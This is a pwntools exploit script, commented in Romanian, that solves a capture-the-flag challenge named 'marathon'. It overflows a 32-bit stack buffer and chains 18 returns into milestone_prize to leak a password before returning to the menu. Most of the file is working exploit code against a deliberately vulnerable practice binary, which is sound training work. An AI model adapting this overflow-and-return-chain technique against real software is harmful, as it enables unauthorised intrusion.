#!/usr/bin/env python3
# ============================================================================
# CTF: marathon — stack BOF cu lant de return-uri (ret sled)
# Vulnerabilitate: overflow (44 padding) => umpli return-urile cu milestone_prize
#   de 18 ori (fiecare apel scurge un caracter din parola), apoi revii in menu().
#   Apoi alegi optiunea 2 ("cheat code") si introduci parola scursa.
# Binar: ELF 32-bit (i386), not stripped | NX OFF · fara canary · No-PIE · Partial RELRO
#   - Fara canary => overflow direct. No-PIE => milestone_prize/menu la adrese fixe,
#     deci lantul de return-uri catre ele functioneaza. NX irelevant (fara shellcode).
# ============================================================================
import sys
from pwn import *

context.binary = elf = ELF('./marathon')
context.log_level = 'error'          # scoate zgomotul pwntools

def connect():
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./marathon')

p = connect()

milestone_prize = elf.symbols['milestone_prize']
menu = elf.symbols['menu']

p.recvuntil(b"Enter 1 for marathon or 2 for cheat code: ")
p.sendline(b"1")

p.recvuntil(b"Some words before start?")
payload = b'A' * 44
payload += p32(milestone_prize) * 18
payload += p32(menu)
p.sendline(payload)

# afiseaza output-ul brut (liniile Km cu caracterele parolei)
print(p.recvuntil(b"Enter 1 for marathon or 2 for cheat code: ").decode(errors="replace"))
p.sendline(b"2")

# de aici scrii tu parola manual in terminal (apare "Enter password:")
p.interactive()